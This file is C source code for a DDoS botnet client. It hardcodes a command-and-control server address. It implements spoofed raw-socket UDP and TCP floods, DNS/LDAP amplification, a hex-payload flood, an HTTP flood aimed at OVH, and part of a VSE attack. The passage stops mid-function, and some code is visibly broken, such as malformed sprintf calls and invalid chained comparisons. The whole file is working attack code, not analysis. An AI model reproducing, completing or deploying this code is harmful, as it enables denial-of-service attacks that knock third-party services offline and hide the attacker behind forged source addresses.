/*

*     This bot is very simple, the smaller the bot the better.

*/
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#define SERVER_LIST_SIZE (sizeof(Simpsserv) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define PHI 0x9e3779b9
#define power 512 /* ovh method power */
#define stdpower 250 /* std method power */
#define dnspower 250 /* dns methid power */
unsigned char *Simpsserv[] = {"45.14.224.127:65525"}; //1.1.1.1:65525
int initConnection();
void makeRandomStr(unsigned char *buf, int length);
int sockprintf(int sock, char *formatStr, ...);
char *inet_ntoa(struct in_addr in);
int Simpsicsock = 0, currentServer = -1, gotIP = 0;
uint32_t *pids;
uint64_t numpids = 0;
struct in_addr ourIP;
static uint32_t x, y, z, w;
static uint32_t Q[4096], c = 362436;
unsigned char macAddress[6] = {0};
const char *useragents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
    "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
};
void init_rand(uint32_t x)
{
        int i;

        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;

        for (i = 3; i < 4096; i++)
                Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = t + c;
        if (x < c)
        {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
in_addr_t getRandomIP(in_addr_t netmask)
{
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ (rand_cmwc() & ~netmask);
}
struct bot_id
{
        char id[512];
} bot;
unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int got = 1, total = 0;
        while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n')
        {
                got = read(fd, buffer + total, 1);
                total++;
        }
        return got == 0 ? NULL : buffer;
}
int socket_connect(char *host, in_port_t port)
{
        struct hostent *hp;
        struct sockaddr_in addr;
        int on = 1, sock;
        if ((hp = gethostbyname(host)) == NULL)
                return 0;
        bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
        addr.sin_port = htons(port);
        addr.sin_family = AF_INET;
        sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
        if (sock == -1)
                return 0;
        if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
                return 0;
        return sock;
}
int getOurIP()
{
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock == -1)
                return 0;

        struct sockaddr_in serv;
        memset(&serv, 0, sizeof(serv));
        serv.sin_family = AF_INET;
        serv.sin_addr.s_addr = inet_addr("8.8.8.8");
        serv.sin_port = htons(53);

        int err = connect(sock, (const struct sockaddr *)&serv, sizeof(serv));
        if (err == -1)
                return 0;

        struct sockaddr_in name;
        socklen_t namelen = sizeof(name);
        err = getsockname(sock, (struct sockaddr *)&name, &namelen);
        if (err == -1)
                return 0;

        ourIP.s_addr = name.sin_addr.s_addr;
        int cmdline = open("/proc/net/route", O_RDONLY);
        char linebuf[4096];
        while (fdgets(linebuf, 4096, cmdline) != NULL)
        {
                if (strstr(linebuf, "\t00000000\t") != NULL)
                {
                        unsigned char *pos = linebuf;
                        while (*pos != '\t')
                                pos++;
                        *pos = 0;
                        break;
                }
                memset(linebuf, 0, 4096);
        }
        close(cmdline);

        if (*linebuf)
        {
                int i;
                struct ifreq ifr;
                strcpy(ifr.ifr_name, linebuf);
                ioctl(sock, SIOCGIFHWADDR, &ifr);
                for (i = 0; i < 6; i++)
                        macAddress[i] = ((unsigned char *)ifr.ifr_hwaddr.sa_data)[i];
        }

        close(sock);
}
void trim(char *str)
{
        int i;
        int begin = 0;
        int end = strlen(str) - 1;

        while (isspace(str[begin]))
                begin++;

        while ((end >= begin) && isspace(str[end]))
                end--;
        for (i = begin; i <= end; i++)
                str[i - begin] = str[i];

        str[i - begin] = '\0';
}
static void printchar(unsigned char **str, int c)
{
        if (str)
        {
                **str = c;
                ++(*str);
        }
        else
                (void)write(1, &c, 1);
}
static int prints(unsigned char **out, const unsigned char *string, int width, int pad)
{
        register int pc = 0, padchar = ' ';

        if (width > 0)
        {
                register int len = 0;
                register const unsigned char *ptr;
                for (ptr = string; *ptr; ++ptr)
                        ++len;
                if (len >= width)
                        width = 0;
                else
                        width -= len;
                if (pad & PAD_ZERO)
                        padchar = '0';
        }
        if (!(pad & PAD_RIGHT))
        {
                for (; width > 0; --width)
                {
                        printchar(out, padchar);
                        ++pc;
                }
        }
        for (; *string; ++string)
        {
                printchar(out, *string);
                ++pc;
        }
        for (; width > 0; --width)
        {
                printchar(out, padchar);
                ++pc;
        }

        return pc;
}
static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
        unsigned char print_buf[PRINT_BUF_LEN];
        register unsigned char *s;
        register int t, neg = 0, pc = 0;
        register unsigned int u = i;

        if (i == 0)
        {
                print_buf[0] = '0';
                print_buf[1] = '\0';
                return prints(out, print_buf, width, pad);
        }

        if (sg && b == 10 && i < 0)
        {
                neg = 1;
                u = -i;
        }

        s = print_buf + PRINT_BUF_LEN - 1;
        *s = '\0';

        while (u)
        {
                t = u % b;
                if (t >= 10)
                        t += letbase - '0' - 10;
                *--s = t + '0';
                u /= b;
        }

        if (neg)
        {
                if (width && (pad & PAD_ZERO))
                {
                        printchar(out, '-');
                        ++pc;
                        --width;
                }
                else
                {
                        *--s = '-';
                }
        }

        return pc + prints(out, s, width, pad);
}
static int print(unsigned char **out, const unsigned char *format, va_list args)
{
        register int width, pad;
        register int pc = 0;
        unsigned char scr[2];

        for (; *format != 0; ++format)
        {
                if (*format == '%')
                {
                        ++format;
                        width = pad = 0;
                        if (*format == '\0')
                                break;
                        if (*format == '%')
                                goto out;
                        if (*format == '-')
                        {
                                ++format;
                                pad = PAD_RIGHT;
                        }
                        while (*format == '0')
                        {
                                ++format;
                                pad |= PAD_ZERO;
                        }
                        for (; *format >= '0' && *format <= '9'; ++format)
                        {
                                width *= 10;
                                width += *format - '0';
                        }
                        if (*format == 's')
                        {
                                register char *s = (char *)va_arg(args, int);
                                pc += prints(out, s ? s : "(null)", width, pad);
                                continue;
                        }
                        if (*format == 'd')
                        {
                                pc += printi(out, va_arg(args, int), 10, 1, width, pad, 'a');
                                continue;
                        }
                        if (*format == 'x')
                        {
                                pc += printi(out, va_arg(args, int), 16, 0, width, pad, 'a');
                                continue;
                        }
                        if (*format == 'X')
                        {
                                pc += printi(out, va_arg(args, int), 16, 0, width, pad, 'A');
                                continue;
                        }
                        if (*format == 'u')
                        {
                                pc += printi(out, va_arg(args, int), 10, 0, width, pad, 'a');
                                continue;
                        }
                        if (*format == 'c')
                        {
                                scr[0] = (unsigned char)va_arg(args, int);
                                scr[1] = '\0';
                                pc += prints(out, scr, width, pad);
                                continue;
                        }
                }
                else
                {
                out:
                        printchar(out, *format);
                        ++pc;
                }
        }
        if (out)
                **out = '\0';
        va_end(args);
        return pc;
}
int sockprintf(int sock, char *formatStr, ...)
{
        unsigned char *textBuffer = malloc(2048);
        memset(textBuffer, 0, 2048);
        char *orig = textBuffer;
        va_list args;
        va_start(args, formatStr);
        print(&textBuffer, formatStr, args);
        va_end(args);
        orig[strlen(orig)] = '\n';
        int q = send(sock, orig, strlen(orig), MSG_NOSIGNAL);
        free(orig);
        return q;
}
int getHost(unsigned char *toGet, struct in_addr *i)
{
        struct hostent *h;
        if ((i->s_addr = inet_addr(toGet)) == -1)
                return 1;
        return 0;
}
void makeRandomStr(unsigned char *buf, int length)
{
        int i = 0;
        for (i = 0; i < length; i++)
                buf[i] = (rand_cmwc() % (91 - 65)) + 65;
}
int recvLine(int socket, unsigned char *buf, int bufsize)
{
        memset(buf, 0, bufsize);
        fd_set myset;
        struct timeval tv;
        tv.tv_sec = 30;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(socket, &myset);
        int selectRtn, retryCount;
        if ((selectRtn = select(socket + 1, &myset, NULL, &myset, &tv)) <= 0)
        {
                while (retryCount < 10)
                {
                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(socket, &myset);
                        if ((selectRtn = select(socket + 1, &myset, NULL, &myset, &tv)) <= 0)
                        {
                                retryCount++;
                                continue;
                        }
                        break;
                }
        }
        unsigned char tmpchr;
        unsigned char *cp;
        int count = 0;
        cp = buf;
        while (bufsize-- > 1)
        {
                if (recv(Simpsicsock, &tmpchr, 1, 0) != 1)
                {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
                if (tmpchr == '\n')
                        break;
                count++;
        }
        *cp = 0x00;
        return count;
}
int connectTimeout(int fd, char *host, int port, int timeout)
{
        struct sockaddr_in dest_addr;
        fd_set myset;
        struct timeval tv;
        socklen_t lon;

        int valopt;
        long arg = fcntl(fd, F_GETFL, NULL);
        arg |= O_NONBLOCK;
        fcntl(fd, F_SETFL, arg);

        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if (getHost(host, &dest_addr.sin_addr))
                return 0;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        if (res < 0)
        {
                if (errno == EINPROGRESS)
                {
                        tv.tv_sec = timeout;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(fd, &myset);
                        if (select(fd + 1, NULL, &myset, NULL, &tv) > 0)
                        {
                                lon = sizeof(int);
                                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void *)(&valopt), &lon);
                                if (valopt)
                                        return 0;
                        }
                        else
                                return 0;
                }
                else
                        return 0;
        }

        arg = fcntl(fd, F_GETFL, NULL);
        arg &= (~O_NONBLOCK);
        fcntl(fd, F_SETFL, arg);

        return 1;
}
int listFork()
{
        uint32_t parent, *newpids, i;
        parent = fork();
        if (parent <= 0)
                return parent;
        numpids++;
        newpids = (uint32_t *)malloc((numpids + 1) * 4);
        for (i = 0; i < numpids - 1; i++)
                newpids[i] = pids[i];
        newpids[numpids - 1] = parent;
        free(pids);
        pids = newpids;
        return parent;
}
unsigned short csum(unsigned short *buf, int count)
{
        register uint64_t sum = 0;
        while (count > 1)
        {
                sum += *buf++;
                count -= 2;
        }
        if (count > 0)
        {
                sum += *(unsigned char *)buf;
        }
        while (sum >> 16)
        {
                sum = (sum & 0xffff) + (sum >> 16);
        }
        return (uint16_t)(~sum);
}
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{

        struct tcp_pseudo
        {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr = iph->saddr;
        pseudohead.dst_addr = iph->daddr;
        pseudohead.zero = 0;
        pseudohead.proto = IPPROTO_TCP;
        pseudohead.length = htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr));
        unsigned short output = csum(tcp, totaltcp_len);
        free(tcp);
        return output;
}
uint16_t checksum_tcp_udp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
        const uint16_t *buf = buff;
        uint32_t ip_src = iph->saddr;
        uint32_t ip_dst = iph->daddr;
        uint32_t sum = 0;
        int length = len;

        while (len > 1)
        {
                sum += *buf;
                buf++;
                len -= 2;
        }

        if (len == 1)
                sum += *((uint8_t *)buf);

        sum += (ip_src >> 16) & 0xFFFF;
        sum += ip_src & 0xFFFF;
        sum += (ip_dst >> 16) & 0xFFFF;
        sum += ip_dst & 0xFFFF;
        sum += htons(iph->protocol);
        sum += data_len;

        while (sum >> 16)
                sum = (sum & 0xFFFF) + (sum >> 16);

        return ((uint16_t)(~sum));
}
void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
void audp(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if (port == 0)
                dest_addr.sin_port = rand_cmwc();
        else
                dest_addr.sin_port = htons(port);
        if (getHost(target, &dest_addr.sin_addr))
                return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        register unsigned int pollRegister;
        pollRegister = pollinterval;

        if (spoofit == 32)
        {
                int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
                if (!sockfd)
                {
                        return;
                }

                unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
                if (buf == NULL)
                        return;
                memset(buf, 0, packetsize + 1);
                makeRandomStr(buf, packetsize);

                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
                while (1)
                {
                        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                        if (i == pollRegister)
                        {
                                if (port == 0)
                                        dest_addr.sin_port = rand_cmwc();
                                if (time(NULL) > end)
                                        break;
                                i = 0;
                                continue;
                        }
                        i++;
                }
        }
        else
        {
                int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                if (!sockfd)
                {
                        return;
                }

                int tmp = 1;
                if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0)
                {
                        return;
                }

                int counter = 50;
                while (counter--)
                {
                        srand(time(NULL) ^ rand_cmwc());
                        init_rand(rand());
                }

                in_addr_t netmask;

                if (spoofit == 0)
                        netmask = (~((in_addr_t)-1));
                else
                        netmask = (~((1 << (32 - spoofit)) - 1));

                unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
                struct iphdr *iph = (struct iphdr *)packet;
                struct udphdr *udph = (void *)iph + sizeof(struct iphdr);

                makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl(getRandomIP(netmask)), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);

                udph->len = htons(sizeof(struct udphdr) + packetsize);
                udph->source = rand_cmwc();
                udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                udph->check = 0;

                makeRandomStr((unsigned char *)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);

                iph->check = csum((unsigned short *)packet, iph->tot_len);

                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
                while (1)
                {
                        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                        udph->source = rand_cmwc();
                        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                        iph->id = rand_cmwc();
                        iph->saddr = htonl(getRandomIP(netmask));
                        iph->check = csum((unsigned short *)packet, iph->tot_len);

                        if (i == pollRegister)
                        {
                                if (time(NULL) > end)
                                        break;
                                i = 0;
                                continue;
                        }
                        i++;
                }
        }
}
void atcp(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
{
        register unsigned int pollRegister;
        pollRegister = pollinterval;

        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if (port == 0)
                dest_addr.sin_port = rand_cmwc();
        else
                dest_addr.sin_port = htons(port);
        if (getHost(target, &dest_addr.sin_addr))
                return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if (!sockfd)
        {
                return;
        }

        int tmp = 1;
        if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0)
        {
                return;
        }

        in_addr_t netmask;

        if (spoofit == 0)
                netmask = (~((in_addr_t)-1));
        else
                netmask = (~((1 << (32 - spoofit)) - 1));

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl(getRandomIP(netmask)), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;

        if (!strcmp(flags, "all"))
        {
                tcph->syn = 1;
                tcph->rst = 1;
                tcph->fin = 1;
                tcph->ack = 1;
                tcph->psh = 1;
        }
        else
        {
                unsigned char *pch = strtok(flags, ",");
                while (pch)
                {
                        if (!strcmp(pch, "syn"))
                        {
                                tcph->syn = 1;
                        }
                        else if (!strcmp(pch, "rst"))
                        {
                                tcph->rst = 1;
                        }
                        else if (!strcmp(pch, "fin"))
                        {
                                tcph->fin = 1;
                        }
                        else if (!strcmp(pch, "ack"))
                        {
                                tcph->ack = 1;
                        }
                        else if (!strcmp(pch, "psh"))
                        {
                                tcph->psh = 1;
                        }
                        else
                        {
                        }
                        pch = strtok(NULL, ",");
                }
        }
        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
        tcph->check = tcpcsum(iph, tcph);

        iph->check = csum((unsigned short *)packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while (1)
        {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                iph->saddr = htonl(getRandomIP(netmask));
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum((unsigned short *)packet, iph->tot_len);

                if (i == pollRegister)
                {
                        if (time(NULL) > end)
                                break;
                        i = 0;
                        continue;
                }
                i++;
        }
}
void adns(unsigned char *ip, int port, int secs)
{
        int dns;
        dns = socket(AF_INET, SOCK_DGRAM, 0);
        time_t start = time(NULL);
        struct sockaddr_in sin;
        struct hostent *hp;
        hp = gethostbyname(ip);
        bzero((char *)&sin, sizeof(sin));
        bcopy(hp->h_addr, (char *)&sin.sin_addr, hp->h_length);
        sin.sin_family = hp->h_addrtype;
        sin.sin_port = port;
        unsigned int a = 0;
        while (1)
        {
                char *dnsstrings[] = {"\x30\x84\x00\x00\x00\x2d\x02\x01\x07\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00"};
                if (a >= 50)
                {
                        send(dns, dnsstrings, dnspower, 0);
                        connect(dns, (struct sockaddr *)&sin, sizeof(sin));
                        if (time(NULL) >= start + secs)
                        {
                                close(dns);
                                _exit(0);
                        }
                        a = 0;
                }
                a++;
        }
}
void std(unsigned char *ip, int port, int secs)
{
        int std_hex;
        std_hex = socket(AF_INET, SOCK_DGRAM, 0);
        time_t start = time(NULL);
        struct sockaddr_in sin;
        struct hostent *hp;
        hp = gethostbyname(ip);
        bzero((char *)&sin, sizeof(sin));
        bcopy(hp->h_addr, (char *)&sin.sin_addr, hp->h_length);
        sin.sin_family = hp->h_addrtype;
        sin.sin_port = port;
        unsigned int a = 0;
        while (1)
        {
                char *hexstring[] = {"\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7\xC0\xE6\xF5\x9B\xDC\x23\x6E\x12\x29\x25\x1D\x0A\xEF\xFB\xDE\xB6\xB1\x94\xD6\x7A\x6B\x01\x34\x26\x1D\x56\xA5\xD5\x8C\x91\xBC\x8B\x96\x29\x6D\x4E\x59\x38\x4F\x5C\xF0\xE2\xD1\x9A\xEA\xF8\xD0\x61\x7C\x4B\x57\x2E\x7C\x59\xB7\xA5\x84\x99\xA4\xB3\x8E\xD1\x65\x46\x51\x30\x77\x44\x08\xFA\xD9\x92\xE2\xF0\xC8\xD5\x60\x77\x52\x6D\x21\x02\x1D\xFC\xB3\x80\xB4\xA6\x9D\xD4\x28\x24\x03\x5A\x35\x14\x5B\xA8\xE0\x8A\x9A\xE8\xC0\x91\x6C\x7B\x47\x5E\x6C\x69\x47\xB5\xB4\x89\xDC\xAF\xAA\xC1\x2E\x6A\x04\x10\x6E\x7A\x1C\x0C\xF9\xCC\xC0\xA0\xF8\xC8\xD6\x2E\x0A\x12\x6E\x76\x42\x5A\xA6\xBE\x9F\xA6\xB1\x90\xD7\x24\x64\x15\x1C\x20\x0A\x19\xA8\xF9\xDE\xD1\xBE\x96\x95\x64\x38\x4C\x53\x3C\x40\x56\xD1\xC5\xED\xE8\x90\xB0\xD2\x22\x68\x06\x5B\x38\x33\x00\xF4\xF3\xC6\x96\xE5\xFA\xCA\xD8\x30\x0D\x50\x23\x2E\x45\x52\xF6\x80\x94"};
                if (a >= 50)
                {
                        send(std_hex, hexstring, stdpower, 0);
                        connect(std_hex, (struct sockaddr *)&sin, sizeof(sin));
                        if (time(NULL) >= start + secs)
                        {
                                close(std_hex);
                                _exit(0);
                        }
                        a = 0;
                }
                a++;
        }
}
void ovhl7(char *host, in_port_t port, int timeEnd)
{
        int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
        char request[512], buffer[1], pgetData[2048];
        sprintf(pgetData, "\x00", "\x01", "\x02",
                "\x03", "\x04", "\x05", "\x06", "\x07", "\x08", "\x09",
                "\x0a", "\x0b", "\x0c", "\x0d", "\x0e", "\x0f", "\x10",
                "\x11", "\x12", "\x13", "\x14", "\x15", "\x16", "\x17",
                "\x18", "\x19", "\x1a", "\x1b", "\x1c", "\x1d", "\x1e",
                "\x1f", "\x20", "\x21", "\x22", "\x23", "\x24", "\x25",
                "\x26", "\x27", "\x28", "\x29", "\x2a", "\x2b", "\x2c",
                "\x2d", "\x2e", "\x2f", "\x30", "\x31", "\x32", "\x33",
                "\x34", "\x35", "\x36", "\x37", "\x38", "\x39", "\x3a",
                "\x3b", "\x3c", "\x3d", "\x3e", "\x3f", "\x40", "\x41",
                "\x42", "\x43", "\x44", "\x45", "\x46", "\x47", "\x48",
                "\x49", "\x4a", "\x4b", "\x4c", "\x4d", "\x4e", "\x4f",
                "\x50", "\x51", "\x52", "\x53", "\x54", "\x55", "\x56",
                "\x57", "\x58", "\x59", "\x5a", "\x5b", "\x5c", "\x5d",
                "\x5e", "\x5f", "\x60", "\x61", "\x62", "\x63", "\x64",
                "\x65", "\x66", "\x67", "\x68", "\x69", "\x6a", "\x6b",
                "\x6c", "\x6d", "\x6e", "\x6f", "\x70", "\x71", "\x72",
                "\x73", "\x74", "\x75", "\x76", "\x77", "\x78", "\x79",
                "\x7a", "\x7b", "\x7c", "\x7d", "\x7e", "\x7f", "\x80",
                "\x81", "\x82", "\x83", "\x84", "\x85", "\x86", "\x87",
                "\x88", "\x89", "\x8a", "\x8b", "\x8c", "\x8d", "\x8e",
                "\x8f", "\x90", "\x91", "\x92", "\x93", "\x94", "\x95",
                "\x96", "\x97", "\x98", "\x99", "\x9a", "\x9b", "\x9c",
                "\x9d", "\x9e", "\x9f", "\xa0", "\xa1", "\xa2", "\xa3",
                "\xa4", "\xa5", "\xa6", "\xa7", "\xa8", "\xa9", "\xaa",
                "\xab", "\xac", "\xad", "\xae", "\xaf", "\xb0", "\xb1",
                "\xb2", "\xb3", "\xb4", "\xb5", "\xb6", "\xb7", "\xb8",
                "\xb9", "\xba", "\xbb", "\xbc", "\xbd", "\xbe", "\xbf",
                "\xc0", "\xc1", "\xc2", "\xc3", "\xc4", "\xc5", "\xc6",
                "\xc7", "\xc8", "\xc9", "\xca", "\xcb", "\xcc", "\xcd",
                "\xce", "\xcf", "\xd0", "\xd1", "\xd2", "\xd3", "\xd4",
                "\xd5", "\xd6", "\xd7", "\xd8", "\xd9", "\xda", "\xdb",
                "\xdc", "\xdd", "\xde", "\xdf", "\xe0", "\xe1", "\xe2",
                "\xe3", "\xe4", "\xe5", "\xe6", "\xe7", "\xe8", "\xe9",
                "\xea", "\xeb", "\xec", "\xed", "\xee", "\xef", "\xf0",
                "\xf1", "\xf2", "\xf3", "\xf4", "\xf5", "\xf6", "\xf7",
                "\xf8", "\xf9", "\xfa", "\xfb", "\xfc", "\xfd", "\xfe", "\xff");
        for (i = 0; i < power; i++)
        {
                sprintf(request, "PGET \0\0\0\0\0\0%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", pgetData, host, useragents);
                if (fork())
                {
                        while (end > time(NULL))
                        {
                                socket = socket_connect(host, port);
                                if (socket != 0)
                                {
                                        write(socket, request, strlen(request));
                                        read(socket, buffer, 1);
                                        close(socket);
                                }
                        }
                        exit(0);
                }
        }
}
void makevsepacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
        char *vse_payload;
        int vse_payload_len;
        int vserand;
        srand(time(NULL));
        vserand = rand() % 60;
        if (vserand < 20)
        {
                vse_payload = "/58/x49/x4a/x20/x51/x22/x29/x29/x51/x50/x57/x4b/x4f/x4d/x20/x54/x45/x4d/x4b/x22/x20/x6c/x78/x50/x51/x7b/x58/x4c/x20/x22/x28/x4b/x69/x6a/x6e/x6a/x4e/x4b/x20/x58/x4e/x43/x4b/x46/x45/x3a/x4c/x3a/x20/x22/x22/x33/x35/x34/x35/x20/x32/x73/x6d/x6b/x6c/x78/x43/x20/x4b/x4d/x4c/x44", &vse_payload_len;
        }
        else if (20 < vserand < 40)
        {
                vse_payload = "/46/x55/x5a/xc2/xa3/x20/x44/xc2/xa3/x53/x54/x20/x53/x30/x22/xc2/xa3/x43/x45/x20/x22/x29/x21/x28/x32/x30/x39/x31/x20/x53/x49/x58/x20/x33/xc2/xa3/x43/x53/x54/x20/x46/x4c/x4f/x22/x53/x44/x20/x22/x29/x21/x28/x20/x43/x49/x57/x4a/x4f/x20/x59/x48/x53/x20/x48/x20/x78/x4b/x4d/x4f", &vse_payload_len;
        }
        else if (40 < vserand < 60)
        {
                vse_payload = "/x4f/x4b/x58/x50/x7b/x20/x5f/x57/x44/x44/x57/x44/6ax/x4a/x4b/x4d/x44/x20/x44/x57/x29/x5f/x20/x44/x57/x20/x53/x4c/x52/x4f/x4d/x20/x43/x50/x4c/x3a/x50/", &vse_payload_len;
        }

        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + vse_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
void vseattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
{
        char *vse_payload;
        int vse_payload_len;
        int vserand;
        srand(time(NULL));
        vserand = rand() % 60;
        if (vserand < 20)
        {
                vse_payload = "/58/x49/x4a/x20/x51/x22/x29/x29/x51/x50/x57/x4b/x4f/x4d/x20/x54/x45/x4d/x4b/x22/x20/x6c/x78/x50/x51/x7b/x58/x4c/x20/x22/x28/x4b/x69/x6a/x6e/x6a/x4e/x4b/x20/x58/x4e/x43/x4b/x46/x45/x3a/x4c/x3a/x20/x22/x22/x33/x35/x34/x35/x20/x32/x73/x6d/x6b/x6c/x78/x43/x20/x4b/x4d/x4c/x44", &vse_payload_len;
        }
        else if (20 < vserand < 40)
        {
